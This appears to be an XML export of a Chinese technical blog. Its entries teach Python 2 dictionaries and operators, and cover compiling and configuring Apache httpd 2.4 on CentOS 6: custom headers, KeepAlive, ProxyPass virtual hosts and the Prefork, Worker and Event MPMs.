&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果用字典里没有的键访问数据，会输出如下错误： 12345#!/usr/bin/python dict = &#123;'Name': 'Zara', 'Age': 7, 'Class': 'First'&#125;; print "dict['Alice']: ", dict['Alice']; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例输出结果： 12345dict['Alice']: Traceback (most recent call last): File "test.py", line 5, in &lt;module&gt; print "dict['Alice']: ", dict['Alice'];KeyError: 'Alice' 修改字典&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;向字典添加新内容的方法是增加新个键/值对，修改或删除已有键/值对： 12345678910#!/usr/bin/python dict = &#123;'Name': 'Zara', 'Age': 7, 'Class': 'First'&#125;; dict['Age'] = 8; # update existing entrydict['School'] = "DPS School"; # Add new entry print "dict['Age']: ", dict['Age'];print "dict['School']: ", dict['School']; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 12dict['Age']: 8dict['School']: DPS School 删除字典元素&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;能删除单一的元素也能清空字典，清空只需一向操作。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示删除一个字典用 del 命令： 1234567891011#!/usr/bin/python# -*- coding: UTF-8 -*- dict = &#123;'Name': 'Zara', 'Age': 7, 'Class': 'First'&#125;; del dict['Name']; # 删除键是'Name'的条目dict.clear(); # 清空词典所有条目del dict ; # 删除词典 print "dict['Age']: ", dict['Age'];print "dict['School']: ", dict['School']; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但这会引发一个异常，因为用 del 后字典不再存在： 12345dict['Age']:Traceback (most recent call last): File "test.py", line 8, in &lt;module&gt; print "dict['Age']: ", dict['Age'];TypeError: 'type' object is unsubscriptable 字典键的特性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字典值可以没有限制地取任何 Python 对象，既可以是标准的对象，也可以是用户定义的，但键不行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个重要的点需要记住 不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住： 12345#!/usr/bin/pythondict = &#123;'Name':'zata', 'Age': 7, 'Name': 'Manni'&#125;;print "dict['Name']: ", dict['Name']; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果 1dict['Name']: Manni 键必须不可变，所以可以用数字，字符串或元组充当，所以用列表就不行： 12345#!/usr/bin/python dict = &#123;['Name']: 'Zara', 'Age': 7&#125;; print "dict['Name']: ", dict['Name']; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 1234Traceback (most recent call last): File "test.py", line 3, in &lt;module&gt; dict = &#123;['Name']: 'Zara', 'Age': 7&#125;;TypeError: list objects are unhashable 字典内置函数&amp;方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 字典包含了以下内置函数： 序号 函数及描述 1 cmp(dict1, dict2)%E6%96%B9%E6%B3%95.md)，较两个字典元素 2 len(dict)%E6%96%B9%E6%B3%95.md)，计算字典元素个数，既键的总和。 3 str(dict)%E6%96%B9%E6%B3%95.md)，输出字典可打印的字符串表示。 4 type(variable)%E6%96%B9%E6%B3%95.md)，返回输入的变量类型，如果变量是字典就返回字典类型。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Python 字典包含了以下内置方法： 序号 函数及描述 1 dict.clear()%E6%96%B9%E6%B3%95.md)，删除字典内所有元素 2 dict.copy()%20%E6%96%B9%E6%B3%95.md)，返回一个字典的浅复制 3 dict.fromkeys(seq[, val]))%E6%96%B9%E6%B3%95.md)，创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值 4 dict.get(key, default=None)%E6%96%B9%E6%B3%95.md)，返回指定键的值，如果值不在字典中返回default值 5 dict.has_key(key)%E6%96%B9%E6%B3%95.md)，如果键在字典dict里返回true，否则返回false 6 dict.items()%E6%96%B9%E6%B3%95.md)，以列表返回可遍历的(键, 值) 元组数组 7 dict.keys()%E6%96%B9%E6%B3%95.md)，以列表返回一个字典所有的键 8 dict.setdefault(key, default=None)%E6%96%B9%E6%B3%95.md)，和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default 9 dict.update(dict2)%E6%96%B9%E6%B3%95.md)，把字典dict2的键/值对更新到dict里 10 dict.values()%E6%96%B9%E6%B3%95.md)，以列表返回字典中的所有值 11 pop(key[,default])%E6%96%B9%E6%B3%95.md)，删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。 12 popitem()%E6%96%B9%E6%B3%95.md)，随机返回并删除字典中的一对键和值。]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 的变量]]></title>
    <url>%2F2017%2F08%2F10%2FPython%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E7%AF%87%2F1.%20Python%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F1.4%20Python%20%E7%9A%84%E5%8F%98%E9%87%8F%2F5.%20Python%20%E7%9A%84%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[Python 的变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;变量是计算机内存中的一块区域，变量可以存储规定范围内的值，而且值可以改变。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;python下变量是对一个数据的引用。 变量的命名： 变量名由字母、数字、下划线组成。 变量不能以数字开头 不可以使用关键字 a a1 _a，这些都是合法的变量名 表达式是将不同的数据（包括变量、函数）用运算符号按一定规则连接起来的一种式子。 Python对象的三要素：id、type、value id：是对象的唯一标识，是对象在内存中的存储地址 type：是对象的数据类型 value：是对象的值，是对象在内存中存放的数据 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有一个name，理解为变量名 ###变量的赋值：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;变量的声明和定义的过程 123456789101112In [1]: a=1 In [2]: id(a)Out[2]: 13933672 In [3]: id(a)Out[3]: 13933672 In [4]: a=2 In [5]: id(a)Out[5]: 13933648 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;id（a）表示变量a在内存里的位置，a的变量值发生改变，在内存中的位置也发生改变。 Python 运算符1.算数运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;+，一个值加上另一个值，也可以是一个字符串加上另一个字符串 12345In [38]: 3 + 4Out[38]: 7 In [39]: 'a' + 'b'Out[39]: 'ab' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-，一个值减去另一个值 12In [40]: 5 - 4Out[40]: 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*，一个值乘以另一个值 12In [44]: 3 * 4Out[44]: 12 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/，一个值除以另一个值 12In [45]: 4 / 3Out[45]: 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这里只取整数，如果想要小数点，那么除法运算的两个数值至少一个要是浮点数 12345In [46]: 4.0 / 3Out[46]: 1.3333333333333333 In [47]: 4 / 3.0Out[47]: 1.3333333333333333 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;//，只取整除，数值带上小数点也只取整数 12345678In [48]: 4.0 // 3Out[48]: 1.0 In [49]: 4 // 3.0Out[49]: 1.0 In [50]: 4 // 3Out[50]: 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;%，表示取余 12345678In [51]: 4 % 3Out[51]: 1 In [52]: 5 % 3Out[52]: 2 In [53]: 6 % 3Out[53]: 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;**，表示乘方 12345In [54]: 2 ** 3Out[54]: 8 In [55]: 2 ** 10Out[55]: 1024 2.关系（比较）运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&gt;，大于 12345In [56]: 2 &gt; 1Out[56]: True In [57]: 1 &gt; 2Out[57]: False &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&lt;，小于 12345In [58]: 2 &lt; 3Out[58]: True In [59]: 3 &lt; 2Out[59]: False &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&gt;=，大于等于 12345678In [60]: 2 &gt;= 1Out[60]: True In [61]: 2 &gt;= 2Out[61]: True In [62]: 2 &gt;= 3Out[62]: False &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&lt;=，小于等于 12345678In [63]: 2 &lt;=3Out[63]: True In [64]: 3 &lt;= 3Out[64]: True In [65]: 4 &lt;= 3Out[65]: False &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;==，恒等于 12345In [72]: 1 == 1Out[72]: True In [73]: 1 == 2Out[73]: False &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;!=，不等于 12345In [74]: 1 != 2Out[74]: True In [75]: 2 != 2Out[75]: False 3.赋值运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;=，表示直接给变量赋值，如果是字符串必须加上引号 123In [11]: x = 3 In [12]: y = 'abc' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：可以通过 type（）命令查看变量是数字还是字符串 12345In [15]: type(x)Out[15]: int In [16]: type(y)Out[16]: str &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;+=，表示变量 的值再加上一个值（a=a+b） 1234In [13]: x += 2 In [14]: xOut[14]: 5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-=，表示变量的值再减去一个值（a=a-b） 1234In [17]: x -= 1 In [18]: xOut[18]: 4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*=，表示变量的值再乘以一个值（a=a*b） 1234In [19]: x *= 2 In [20]: xOut[20]: 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/=，表示变量的值再除以一个值（a=a/b） 1234In [21]: x /= 4 In [22]: xOut[22]: 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;%=，表示取余，变量被一个数整除后，还剩多少值（a=a%b） 1234567891011121314151617181920In [29]: x=10 In [30]: x %= 3 In [31]: xOut[31]: 1 In [32]: x=9 In [33]: x %= 3 In [34]: xOut[34]: 0 In [35]: x=11 In [36]: x %= 3 In [37]: xOut[37]: 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;**=，表示乘方，a的b次方（a=a**b） 123456In [66]: x = 2 In [67]: x **= 3 In [68]: xOut[68]: 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;//=，表示整除，（a=a//b） 1234567In [68]: xOut[68]: 8 In [69]: x //= 3 In [70]: xOut[70]: 2 4.逻辑运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;and，逻辑与：true and false。表示一个成立and另一个也成立，返回值是 true 12In [77]: 3 &gt; 2 and 1 &lt; 2Out[77]: True &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果其中一个不成立，返回值是 false 12345In [78]: 1 == 2 and 2 &gt; 1Out[78]: False In [79]: 1 &lt; 2 and 1 != 1Out[79]: False &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;or，逻辑或：false or true，表示只要有一个成立那么返回就是true 12In [80]: 1 &lt; 2 or 1 != 1Out[80]: True &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;not，逻辑非：not true，表示取反 12345In [81]: not 1 &lt; 2Out[81]: False In [82]: not 1 != 1Out[82]: True 5.身份运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;身份运算符用来判断两个变量的引用对象是否指向统一个内存的对象，即 id(varibale1)?=id(variable2)。 is：判断两个标识符是不是引用自一个对象 is not：判断两个标识符是不是引用不同对象 123456789In [88]: a = [1,2,3] In [89]: b = [1,2,3] In [90]: print ( a == b )True In [91]: print ( a is b )False &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为变量 a 和变量 b 的 value 是一样的， == 运算符比较的变量的 value ，所以返回true。is 是判断两个变量是否引用同一个对象，也就是比较的是 id ，所以返回 false。 6.成员关系运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;成员运算符能够判断一个指定对象是否是作为一个容器中的元素，由此来判断两个对象间的关系。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;容器：包含了其他对象的引用的数据类型。 in：当一个对象存在一个容器中时为 true not in：当一个对象不在一个容器中时为 true 1234567891011In [93]: a = 1 In [94]: b = 2 In [95]: c = [1,3,4] In [96]: a in cOut[98]: True In [97]: b in cOut[99]: False 7.位运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 Python 中 |、&amp;、^、~等运算符的意思不在于处理逻辑关系，而是二进制数据的为运算，数字以二进制形式的补码存储和计算，以原码结果来显示。若数字为正值，它的补码就是原码本身、若为负值，则它的补码为源码减1再按位取反。两个数字的计算本质是两个二进制补码的计算。 |：按位或运算符，只要对应的二个二进位有一个为1时，结果位就为1. &amp;：按位与运算符，参与运算的两个值，如果两个相应的位都为1，则该位为的结果为1，否则为0 ^：按位异或运算符，当两对应的二进位相异时，结果为1 ~：按位取反运算符，对数据的每个二进制位取反，即把1变为0，把0变为1 12345678910111213a = 0011 1100 b = 0000 1101 ----------------- a&amp;b = 0000 1100 a|b = 0011 1101 a^b = 0011 0001 ~a = 1100 0011 8.位移运算符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;位移运算符是非常有效率的计算方法之一，在对数学运算和对程序执行效率要求高的程序中推荐使用。 &lt;&lt;：左移动运算符，运算数的各二进位全部左移若干位，由 “&lt;&lt;” 右边的数值指定移动的位数，高位丢弃，低位补0 ：右移动运算符，把 “&gt;&gt;” 左边的运算数的各二进位全部右移若干位， “&gt;&gt;” 右边的数指定移动的位数 12345a = 0011 1100 a &lt;&lt; 2 1111 0000 #结果为240 a &gt;&gt; 2 0000 1111 #结果为15 Python运算符优先级&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下标列出了从最高到最低优先级的所有运算符： 运算符 描述 ** 指数 (最高优先级) ~ + - 按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@) * / % // 乘，除，取模和取整除 + - 加法减法 &gt;&gt; &lt;&lt; 右移，左移运算符 &amp; 位 ‘AND’ ^ \ 位运算符 &lt;= &lt; &gt; &gt;= 比较运算符 &lt;&gt; == != 等于运算符 = %= /= //= -= += = *= 赋值运算符 is is not 身份运算符 in not in 成员运算符 not or and 逻辑运算符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下实例演示了python所有运算符优先级的操作： 1234567891011121314151617181920#!/usr/bin/python# -*- coding: UTF-8 -*- a = 20b = 10c = 15d = 5e = 0 e = (a + b) * c / d #( 30 * 15 ) / 5print "(a + b) * c / d 运算结果为：", e e = ((a + b) * c) / d # (30 * 15 ) / 5print "((a + b) * c) / d 运算结果为：", e e = (a + b) * (c / d); # (30) * (15/5)print "(a + b) * (c / d) 运算结果为：", e e = a + (b * c) / d; # 20 + (150/5)print "a + (b * c) / d 运算结果为：", e &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果： 1234(a + b) * c / d 运算结果为： 90((a + b) * c) / d 运算结果为： 90(a + b) * (c / d) 运算结果为： 90a + (b * c) / d 运算结果为： 50]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[centos 6 编译安装httpd-2.4]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F7.%20centos%206%20%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85httpd-2.4%2F</url>
    <content type="text"><![CDATA[centos 6 编译安装httpd-2.4&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;centos6 yum安装的apr版本已经不适用httpd-2.4版本了。所以，需要源码编译apr以及apr-util 下载源码： 123456cd /usr/local/src/wget http://mirrors.cnnic.cn/apache/httpd/httpd-2.4.12.tar.bz2 wget http://mirrors.cnnic.cn/apache/apr/apr-1.5.2.tar.bz2 wget http://mirrors.cnnic.cn/apache/apr/apr-util-1.5.4.tar.gz 安装apr 12345tar jxvf apr-1.5.2.tar.bz2cd apr-1.5.2 ./configure --prefix=/usr/local/aprmake &amp;&amp; make install 安装apr-util 12345tar zxvf apr-util-1.5.4.tar.gz cd apr-util-1.5.4./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr/make &amp;&amp; make install 安装httpd 12345yum install gcc make cmake pcre-devel./configure --prefix=/usr/local/apache2 \--with-apr=/usr/local/apr \--with-apr-util=/usr/local/apr-util/make &amp;&amp; make install]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache设置自定义header]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F62.%20apache%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89header%2F</url>
    <content type="text"><![CDATA[apache设置自定义header 在设置自定义header前，需要先检测一下你的httpd是否加载了mod_headers 1/usr/local/apache2/bin/apachectl -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果，显示有mode_headers.c 则是加载了这个模块，否则就需要重新编译一下了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，如果你使用的是rpm安装的话，那肯定是已经加载了mod_headers这个模块的。 在httpd.conf 中加入 1Header add MyHeader "Hello" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，重启apache就可以了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;双引号中的内容为自定义内容。当然这里的”MyHeader”也是可以自定义的。 测试 1curl -I http://localhost &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看是否显示有 MyHeader “Hello”]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache的keepalive和keepalivetimeout]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F60.%20apache%E7%9A%84keepalive%E5%92%8Ckeepalivetimeout%2F</url>
    <content type="text"><![CDATA[apache的keepalive和keepalivetimeout&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在APACHE的httpd.conf中，KeepAlive指的是保持连接活跃，类似于Mysql的永久连接。换一句话说，如果将KeepAlive设置为On，那么来自同一客户端的请求就不需要再一次连接，避免每次请求都要新建一个连接而加重服务器的负担。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;KeepAlive的连接活跃时间当然是受KeepAliveTimeOut限制的。如果第二次请求和第一次请求之间超过KeepAliveTimeOut的时间的话，第一次连接就会中断，再新建第二个连接。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，一般情况下，图片较多的网站应该把KeepAlive设为On。但是KeepAliveTimeOut应该设置为多少秒就是一个值得讨论的问题了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果KeepAliveTimeOut设置的时间过短，例如设置为1秒，那么APACHE就会频繁的建立新连接，当然会耗费不少的资源；反过来，如果KeepAliveTimeOut设置的时间过长，例如设置为300秒，那么APACHE中肯定有很多无用的连接会占用服务器的资源，也不是一件好事。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，到底要把KeepAliveTimeOut设置为多少，要看网站的流量、服务器的配置而定。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实，这和MySql的机制有点相似，KeepAlive相当于mysql_connec]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache 的 mpm 工作模式]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F8.%20Apache%20%E7%9A%84%20mpm%20%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Apache 的 mpm 工作模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看 apache 工作模式的命令是： 1234567891011121314151617181920212223242526272829[root@lamp ~]# /usr/local/apache2/bin/apachectl -lCompiled in modules: core.c mod_authn_file.c mod_authn_default.c mod_authz_host.c mod_authz_groupfile.c mod_authz_user.c mod_authz_default.c mod_auth_basic.c mod_include.c mod_filter.c mod_log_config.c mod_env.c mod_setenvif.c mod_version.c prefork.c http_core.c mod_mime.c mod_status.c mod_autoindex.c mod_asis.c mod_cgi.c mod_negotiation.c mod_dir.c mod_actions.c mod_userdir.c mod_alias.c mod_so.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache 三种工作模式：prefork 、 worker 、 event 。可以看到apache 个工作模式是 prefork.c 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看 apache 工作模块的命令： 12345678910111213141516171819202122232425262728293031323334[root@lamp ~]# /usr/local/apache2/bin/apachectl -MLoaded Modules: core_module (static) authn_file_module (static) authn_default_module (static) authz_host_module (static) authz_groupfile_module (static) authz_user_module (static) authz_default_module (static) auth_basic_module (static) include_module (static) filter_module (static) log_config_module (static) env_module (static) setenvif_module (static) version_module (static) mpm_prefork_module (static) http_module (static) mime_module (static) status_module (static) autoindex_module (static) asis_module (static) cgi_module (static) negotiation_module (static) dir_module (static) actions_module (static) userdir_module (static) alias_module (static) so_module (static) deflate_module (shared) expires_module (shared) rewrite_module (shared) php5_module (shared)Syntax OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过这个命令也可以看到哪些模块是动态，哪些是静态。其中以 mpm_ 开头的就是apache 的 mpm 工作模式，2.2版本的 httpd 默认的 mpm 工作模式为 prefork 。2.4版本的 httpd 默认是 event 工作模式。]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache的proxy代理总访问后端web的第一个虚拟主机]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F61.%20apache%E7%9A%84proxy%E4%BB%A3%E7%90%86%E6%80%BB%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFweb%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[apache的proxy代理总访问后端web的第一个虚拟主机&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;问题，如题。怎么折腾都是一直访问第一个虚拟主机，后来找到问题所在。是我配置的不对。错误配置是这样的： 123456789ServerName www.test.comCustomLog "/dev/null" combinedProxyRequests Off Order deny,allowAllow from all ProxyPass / http://192.168.13.111/ProxyPassReverse / 192.168.13.111/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;问题出在了： ProxyPass / http://192.168.13.111/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要改成这样： ProxyPass / http://www.test.com/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以正确的配置是这样的： 123456789ServerName www.test.comCustomLog "/dev/null" combinedProxyRequests Off Order deny,allowAllow from all ProxyPass / http://www.test.com/ProxyPassReverse / 192.168.13.111/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外需要注意的是，需要在/etc/hosts 中加一条记录 1192.168.13.111 www.test.com]]></content>
      <tags>
        <tag>Apache</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache Prefork、Worker和Event三种MPM分析]]></title>
    <url>%2F2017%2F08%2F10%2FApache%2F9.%20Apache%20Prefork%E3%80%81Worker%E5%92%8CEvent%E4%B8%89%E7%A7%8DMPM%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Apache Prefork、Worker和Event三种MPM分析三种MPM介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache 2.X 支持插入式并行处理模块，称为多路处理模块（MPM）。在编译apache时必须选择也只能选择一个MPM，对类UNIX系统，有几个不同的MPM可供选择，它们会影响到apache的速度和可伸缩性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Prefork MPM : 这个多路处理模块(MPM)实现了一个非线程型的、预派生的web服务器，它的工作方式类似于Apache 1.3。它适合于没有线程安全库，需要避免线程兼容性问题的系统。它是要求将每个请求相互独立的情况下最好的MPM，这样若一个请求出现问题就不会影响到其他请求。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个MPM具有很强的自我调节能力，只需要很少的配置指令调整。最重要的是将MaxClients设置为一个足够大的数值以处理潜在的请求高峰，同时又不能太大，以致需要使用的内存超出物理内存的大小。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Worker MPM : 此多路处理模块(MPM)使网络服务器支持混合的多线程多进程。由于使用线程来处理请求，所以可以处理海量请求，而系统资源的开销小于基于进程的MPM。但是，它也使用了多进程，每个进程又有多个线程，以获得基于进程的MPM的稳定性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个进程可以拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程可以建立ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不管是Worker模式或是Prefork 模式，Apache总是试图保持一些备用的(spare)或者是空闲的子进程（空闲的服务线程池）用于迎接即将到来的请求。这样客户端就不需要在得到服务前等候子进程的产生。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Event MPM ：以上两种稳定的MPM方式在非常繁忙的服务器应用下都有些不足。尽管HTTP的Keepalive方式能减少TCP连接数量和网络负载，但是 Keepalive需要和服务进程或者线程绑定，这就导致一个繁忙的服务器会耗光所有的线程。 Event MPM是解决这个问题的一种新模型，它把服务进程从连接中分离出来。在服务器处理速度很快，同时具有非常高的点击率时，可用的线程数量就是关键的资源限 制，此时Event MPM方式是最有效的。一个以Worker MPM方式工作的繁忙服务器能够承受每秒好几万次的访问量（例如在大型新闻服务站点的高峰时），而Event MPM可以用来处理更高负载。值得注意的是，Event MPM不能在安全HTTP（HTTPS）访问下工作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于Event 模式，apache给出了以下警告： 1This MPM is experimental, so it may or may not work as expected . &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种MPM目前处于试验状态，他可能不能按照预期的那样工作。 如何配置三种MPM&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Prefork 是UNIX平台上默认的MPM，它所采用的预派生子进程方式也是apache 1.3中采用的模式。prefork 本身并没有使用到线程，2.0 版本使用它是为了与1.3版保持兼容性；另一方面，perfork用单独的子进程来处理不同的请示，之程之间是彼此独立的，这也使其成为最稳定的MPM之一 。 如何查看当前安装的Apache 的三种MPM。123456[root@localhost apache]# httpd -lCompiled in modules: core.c prefork.c http_core.c mod_so.c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你看到perfork.c 则表示当前为perfork MPM模式。worker.c 则表示为 worker MPM模式。 那么如何设置apache的MPM呢？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要的apache 配置安装的时候需要指定模式： 123[root@localhost httpd-2.4.1]# ./configure --prefix=/usr/local/apache2worker --enable-so --with-mpm=worker [root@localhost httpd-2.4.1]# make[root@localhost httpd-2.4.1]# make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定–with-mpm=NAME 选项指定MPM，NAME就是你想使用的MPM的名称。不指定模式的话，默认为Prefork MPM。 那么如何配置成Event MPM？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同我上面的方法一样，只需要在安装的时候加上以下参数： --enable-nonportable-atomics=yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要注意的是Event MPM对于老的CPU可能是不支持的。 三种MPM参数分析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不管你安装的是apache哪种MPM &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安装完成之后打开…/apache/conf/extra/httpd-mpm.conf文件，找到如下配置： 12345678# perfork MPM&lt;IfModule mpm_prefork_module&gt;StartServers 5MinSpareServers 5MaxSpareServers 10MaxRequestWorkers 250MaxConnectionsPerChild 0&lt;/IfModule&gt; StartServers: 数量的服务器进程开始 MinSpareServers: 最小数量的服务器进程,保存备用 MaxSpareServers: 最大数量的服务器进程,保存备用 MaxRequestWorkers: 最大数量的服务器进程允许开始 MaxConnectionsPerChild: 最大连接数的一个服务器进程服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;prefork 控制进程在最初建立“StartServers”个子进程后，为了满足MinSpareServers设置的需要创建一个进程，等待一秒钟，继续创建两 个，再等待一秒钟，继续创建四个……如此按指数级增加创建的进程数，最多达到每秒32个，直到满足MinSpareServers设置的值为止。这种模式 可以不必在请求到来时再产生新的进程，从而减小了系统开销以增加性能。MaxSpareServers设置了最大的空闲进程数，如果空闲进程数大于这个 值，Apache会自动kill掉一些多余进程。这个值不要设得过大，但如果设的值比MinSpareServers小，Apache会自动把其调整为 MinSpareServers+1。如果站点负载较大，可考虑同时加大MinSpareServers和MaxSpareServers。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MaxRequestsPerChild设置的是每个子进程可处理的请求数。每个子进程在处理了“MaxRequestsPerChild”个请求后将自 动销毁。0意味着无限，即子进程永不销毁。虽然缺省设为0可以使每个子进程处理更多的请求，但如果设成非零值也有两点重要的好处： 可防止意外的内存泄漏。 在服务器负载下降的时侯会自动减少子进程数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此，可根据服务器的负载来调整这个值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MaxRequestWorkers指令集同时将服务请求的数量上的限制。任何连接尝试在MaxRequestWorkerslimit将通常被排队，最多若干基于上ListenBacklog指令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在apache2.3.13以前的版本MaxRequestWorkers被称为MaxClients 。 